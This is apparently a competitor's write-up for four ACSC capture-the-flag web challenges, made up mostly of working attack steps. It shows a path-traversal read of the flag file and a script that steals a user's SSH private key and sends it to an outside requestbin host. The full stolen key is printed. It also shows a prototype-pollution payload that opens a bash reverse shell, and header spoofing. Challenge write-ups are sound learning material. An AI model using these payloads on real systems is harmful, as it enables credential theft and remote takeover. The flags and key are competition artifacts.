## Challenge API
Step 1: Register account
```
id=Taidh123taidh&pw=Taidh123taidh&c=u
```

Step 2: get password admin
```
id=Taidh123taidh&pw=Taidh123taidh&c=i&c2=gp
```
password -> `:<vNk`

Step 3: LFI to get flag
```
id=Taidh123taidh&pw=Taidh123taidh&c=i&pas=:<vNk&c2=gd&db=../../../../../flag
```
Flag -> `ACSC{it_is_hard_to_name_a_flag..isn't_it?}`

## Challenge Baby Developer
Step 1: get id_rsa

Host file `index.html` on my server
```js
<script>
     fetch('http://website/home/stypr/.ssh/id_rsa')
    .then(res=>res.text())
    .then(t=>fetch('https://requestbin.net/r/g2vsizx9?cc='+btoa(t)));
</script>
```

Send `http://host:port`

Decode base64 -> id_rsa
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA0LAi66KTE1Cu/CONzYSvi6Q1iCIpl7C8/VScxDE6TnKQ+tJZ0cx6
FmpUwTl0KH1E8iFa+M67cXaf2M7LOubAQfhLHqrO1HTVSjrcV0GLKxPfVOZnUdeWKktjce
J/IyJ2SBW0e7IGqoY2CkB22N9XfQL7lkapLZTr1tYqSykLPurlzusFD8QGf4o5wZmdRM0x
eyirf06vuuBC7qDxmP1dpHyAskYjV4/FjmVz9cgXhPeTpGL2qtB4JAYr2yOcdc9PAiqrji
hcwW0cRLTLqMUIg+spicZLaT8fm+nfluBNxCIw30eB4xfYV21ec+AJFfzHwZM9wk0W5KqK
AMFPbQQ6ZwAAA8iJxwC6iccAugAAAAdzc2gtcnNhAAABAQDQsCLropMTUK78I43NhK+LpD
WIIimXsLz9VJzEMTpOcpD60lnRzHoWalTBOXQofUTyIVr4zrtxdp/Yzss65sBB+Eseqs7U
dNVKOtxXQYsrE99U5mdR15YqS2Nx4n8jInZIFbR7sgaqhjYKQHbY31d9AvuWRqktlOvW1i
pLKQs+6uXO6wUPxAZ/ijnBmZ1EzTF7KKt/Tq+64ELuoPGY/V2kfICyRiNXj8WOZXP1yBeE
95OkYvaq0HgkBivbI5x1z08CKquOKFzBbRxEtMuoxQiD6ymJxktpPx+b6d+W4E3EIjDfR4
HjF9hXbV5z4AkV/MfBkz3CTRbkqooAwU9tBDpnAAAAAwEAAQAAAQBOBWwo2LFQCVxCnDBJ
5A+Vj6EL8mnGcqdVtyqdFyKLbb3SaI54J5CFjN9/FjHdaWg7dkkCuJfPxd/hOP82WEsM3v
2Gy6lkOQH9LKBwZurXAij/Ht0F9ioISgM18s5BnoLGVIcTr+1aF69gidVlI6sb69+PwX9C
sWiy+4L4crHnpVFzVGA8BvSeyUG9HeizM0Pjpi0/fJqQ0Gz4QA+yrbuYbnhkw915aDQkkX
b0/+0Eo607blu61rt8U9I9AEMUZtM6+sWfWkXJpw2GV3/KRaGKv6VwHJZHoDU+Tmkl997j
BkwkiLlZLpjz3meKCjTePXXmT0OQMA+Mrw90UIWmV6/RAAAAgQCv0YnQRcTgXz876LnK2d
SHfyWDh4JI8Vej3DZa0po05iOUkEUYJmiHPWX9ffwzIXuFcopy2XnH29iXJuxZkNpegW+w
jv36+mxXyyZARfJ4wJhQk1QwOnl+AsRtFhRtSTeqfckVqHy9K+V+MrDhSPkCKOjyEHM62d
qNFDVpf4waQQAAAIEA9llqnmgFFmLVXvIMvgSOygaZbR1LK1a0Hdj9tQeBqhsj3dS2kwoO
4wBhLaxFL629JOrZZ3PVP/s+bgQ7Mr2EqMSRDwb4VzjGvrTKCgOkJZuS1J6N7EyFKBRBdA
Rd7erunijdhp+9U/BN3y2gDbFHDSXJzqA3sl8x6i0dZ1ahZLMAAACBANjdBf7L8lYBRV4j
yWkSMFReExGbD+MevqaXqgyf4v0W8EWNAMbu43prsDFoLYX6SO+Uk35xhx3MTPhcfgzZme
mnayx1zZFEj6OSKcHbPCMTdmZD51Tu+rx4wzGqMeo2zeaPfwEdcsa+WchyzauF889scdad
+zu5XwEK6T2grzV9AAAAEXJvb3RAZGFhMmQ5OTUzMGRlAQ==
-----END OPENSSH PRIVATE KEY-----
```

Step 2: Run ssh to get flag

Save the above private key with filename `id_rsa`

`chmod 400 id_rsa`

Get flag -> `ssh -i id_rsa stypr@baby-developer.chal.acsc.asia -p2222`

Flag -> `ACSC{weird_bugs_pwned_my_system_too_late_to_get_my_CVE}`

## Challenge Cowsay as a Service

Overwirte `shell=node` to trigger
```
POST /setting/shell
cookie: username=__proto__


{"value":"/usr/local/bin/node"}
```

Overwirte `env` to reverse shell
```
POST /setting/env
cookie: username=__proto__


{"value":{
  "NODE_DEBUG" : "require(\"child_process\").execSync(\"bash -c 'bash -i >& /dev/tcp/HOST/PORT 0>&1' \");//",
  "NODE_OPTIONS" : "-r /proc/self/environ"
}}
```

Trigger
```
GET /cowsay?say=taidh
cookie: username=__proto__
```

Flag at `/proc/1/environ`

## Challenge Favorite Emoijs
Step 1: Host file index.html
```js
<script>
        location.href="http://api:8000"
</script>
```
Run command `sudo php -S 0.0.0.0:80`

Step 2: Change Host and User-Agent header
```
GET / HTTP/1.1
Host: Your IP
User-Agent: googlebot
...
```

Flag -> `ACSC{sharks_are_always_hungry}`

## Thank
Writeup full I will upload at http://dauhoangtai.github.io later